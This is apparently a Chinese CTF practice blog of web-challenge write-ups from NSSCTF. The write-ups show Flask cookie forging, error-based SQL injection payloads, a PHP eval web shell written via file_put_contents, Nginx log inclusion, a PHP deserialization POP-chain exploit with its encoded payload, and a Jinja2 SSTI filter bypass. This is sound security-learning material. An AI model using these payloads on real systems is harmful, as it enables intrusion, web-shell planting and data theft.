<h2 id="LitCTF-2023-Flag点击就送！"><a href="#LitCTF-2023-Flag点击就送！" class="headerlink" title="[LitCTF 2023]Flag点击就送！"></a>[LitCTF 2023]Flag点击就送！</h2><p>这道题一进去让我们随便输来验证身份，我们随便输入一个数字，他告诉我们只有管理员才能拿到flag，所以我们尝试回到输入身份的地方并输入admin，但是告诉我们你怎么可能是管理员，并且标签提示我们是cookie伪造，尝试进行查看</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BLitCTF%202023%5DFlag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现cookie，使用flask_session进行cookie伪造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -s &quot;secret_key&quot; -c &quot;需要解密的session值&quot;</span><br></pre></td></tr></table></figure>

<p>但是我们并不知道secret_key是啥，只能猜测是比赛名称LitCTF</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BLitCTF%202023%5DFlag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>解得cookie值，现在我们使用命令在flask_session里对其进行修改并加密</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BLitCTF%202023%5DFlag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>得到对于管理员来讲的加密之后的cookie值</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BLitCTF%202023%5DFlag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>成功拿到flag</p>
<h2 id="NISACTF-2022-join-us"><a href="#NISACTF-2022-join-us" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h2><p>页面一进去发现有很多可点击的地方，先点击登录</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>感觉这个登录框很有注入点的感觉，手测加fuzz一下，这里发现，fuzz测出来or是可以用的，但是手测却又不可以，上网查一下才发现是后端进行了过滤，但是有点不知道该怎么办了，看了一下wp，才想起来可以用||管道符（太久没做，生疏了）</p>
<p>剩下的也没什么过滤了的，就是比较基础的报错注入语句进行查询了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27; ||extractvalue(1,concat(0x7e,(select group_concat(table_name) from mysql.innodb_table_stats),0x7e)) #</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>返回里面得到了表名，FLAG_TABLE肯定最可疑，但是我们查询之后里面并没有，并且这里表名并没有显示完全，使用mid函数截断拼接，发现剩下的表名，这里就不写其中的步骤了，直接查询output</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27; ||extractvalue(1,concat(0x7e, (select * from (select * from output a join output )b),0x7e)) #</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>得到字段名data，直接查询flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27; ||extractvalue(1,concat(0x7e,(select data from output),0x7e)) #</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>这里flag并没有显示完全，和刚刚查表名一样使用mid函数截断看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27; ||extractvalue(1,concat(0x7e,mid((select data from output),20),0x7e)) #</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>得到后半段flag，拼接即可</p>
<h2 id="SWPUCTF-2022-新生赛-numgame"><a href="#SWPUCTF-2022-新生赛-numgame" class="headerlink" title="[SWPUCTF 2022 新生赛]numgame"></a>[SWPUCTF 2022 新生赛]numgame</h2><p>页面一进去是一个怎么都回答不了的10+10，尝试F12获取更多信息，发现没有反应，使用开发者工具打开看看</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dnumgame%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现有一个js文件，尝试访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dnumgame%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>以为直接拿到了flag，高兴坏了，提交显示错误，解码一下flag其中的内容，发现是一个文件名：NsScTf.php，尝试访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dnumgame%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>这里就涉及到一个小知识点：</p>
<p>使用类名::方法名，来访问其中方法，并且我们发现没有过滤大写，所以进行读取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=Nss2::Ctf</span><br></pre></td></tr></table></figure>

<p>F12得到flag。</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dnumgame%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<h2 id="SWPUCTF-2021-新生赛-hardrce-3"><a href="#SWPUCTF-2021-新生赛-hardrce-3" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce_3"></a>[SWPUCTF 2021 新生赛]hardrce_3</h2><img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dhardrce_3%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>这道无字母RCE看样子只能使用自增了，异或和取反都被禁用</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">(6条消息) 无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_无数字正则匹配绕过取反脚本_yu22x的博客-CSDN博客</a></p>
<p>使用yu神的自增脚本，使用之前记得url编码一下</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dhardrce_3%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>ctrl+f查找一下，发现flag那一栏没有值，再查一下disable_function，发现很多常用的函数都被禁用了</p>
<p>但是我们发现file_put_contents函数并没有被禁，所以使用这个函数进行木马文件的写入（注意由于空格被禁了，所以使用%20进行代替）$前面加上了\是防止其被字符串包裹无法发挥作用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=file_put_contents(&quot;1.php&quot;,&quot;&lt;?php%20eval(\$_POST[&#x27;1&#x27;]);%20?&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p>然后蚁剑连接并访问，在网站根目录下找到flag。</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dhardrce_3%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<h2 id="HNCTF-2022-WEEK2-easy-include"><a href="#HNCTF-2022-WEEK2-easy-include" class="headerlink" title="[HNCTF 2022 WEEK2]easy_include"></a>[HNCTF 2022 WEEK2]easy_include</h2><img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20WEEK2%5Deasy_include%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>可以看到题目作为一个文件包含过滤了很多字符，并且标签提醒是一个Nginx，我们尝试一下请求包里UA上传一句话木马，并在日志文件访问，上网搜到Nginx的日志文件路径是&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log </p>
<p>我们抓包进行尝试</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20WEEK2%5Deasy_include%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>可以看到这样做成功得到了回显，那么尝试cat &#x2F;ffflllaaaggg</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20WEEK2%5Deasy_include%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>可以看到就成功拿到flag，这道题操作很简单，但是我之前一直听他们说日志文件包含但没做过类似题目，这次遇到就写上去了</p>
<h2 id="GDOUCTF-2023-反方向的钟"><a href="#GDOUCTF-2023-反方向的钟" class="headerlink" title="[GDOUCTF 2023]反方向的钟"></a>[GDOUCTF 2023]反方向的钟</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$rank</span>,<span class="variable">$salary</span> = <span class="number">10000</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="variable">$rank</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$leader</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hahaha</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$department</span>,<span class="variable">$ceo</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">IPO</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;department-&gt;<span class="title function_ invoke__">hahaha</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">IPO</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>老规矩，像构造pop链，先找到终点</p>
<p>明显是school类中的IPO方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>这里应该就要用到php的原生类了，而提示又有flag.php，所以就使用原生类SplFileObject读取文件</p>
<p>而IPO又需要在school中的wakeup中调用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;department-&gt;<span class="title function_ invoke__">hahaha</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">IPO</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>而调用IPO就需要hahaha符合条件</p>
<p>hahaha是classroom的一个方法,所以这里要实例化classroom赋给dapartment</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hahaha</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>hahaha返回true三个变量相等其中后面两个变量明显是一个对象中的name和rank变量</p>
<p>有这两个变量的只有teacher类，所以要实例化该类并赋值给leader</p>
<p>最后就是在teacher类中赋值name和rank即可</p>
<p>所以就构造exp为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$rank</span>,<span class="variable">$salary</span> = <span class="number">10000</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="variable">$rank</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$leader</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hahaha</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$department</span>,<span class="variable">$ceo</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">IPO</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;department-&gt;<span class="title function_ invoke__">hahaha</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">IPO</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">school</span>(<span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>(<span class="string">&quot;one class&quot;</span>,<span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>(<span class="string">&quot;ing&quot;</span>,<span class="string">&quot;department&quot;</span>)),<span class="string">&quot;ong&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5D%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>可以得到传给d的参数应该为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjozOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO3M6MTU6IgB0ZWFjaGVyAHNhbGFyeSI7aToxMDAwMDt9fXM6MTA6ImhlYWRtYXN0ZXIiO3M6Mzoib25nIjt9</span><br></pre></td></tr></table></figure>

<p>而对于给a和b传的值为（对于a使用php原生类，而b使用伪协议进行读取）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5D%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>直接base64解码就拿到flag了。</p>
<h2 id="NCTF-2018-flask真香"><a href="#NCTF-2018-flask真香" class="headerlink" title="[NCTF 2018]flask真香"></a>[NCTF 2018]flask真香</h2><img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>题目什么都没有，F12也什么都没发现</p>
<p>到处乱点，在点击右下方的小点之后跳转到下一个页面</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE2.png" class>

<p>标签提示是jinja2的SSTI，我们进行测试</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>确实是存在的</p>
<p>接下来试试有没有过滤什么</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>url空了，经过测试，发现过滤了下列字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class  mro  subclasses  builtins  eval  import  open  os</span><br></pre></td></tr></table></figure>

<p>使用字符串拼接的方法来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__bases__[0][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>找到&lt;class ‘os._wrap_close’&gt;，直接用ctrl+F找每个元素都有的字符 &gt; </p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>成功找到</p>
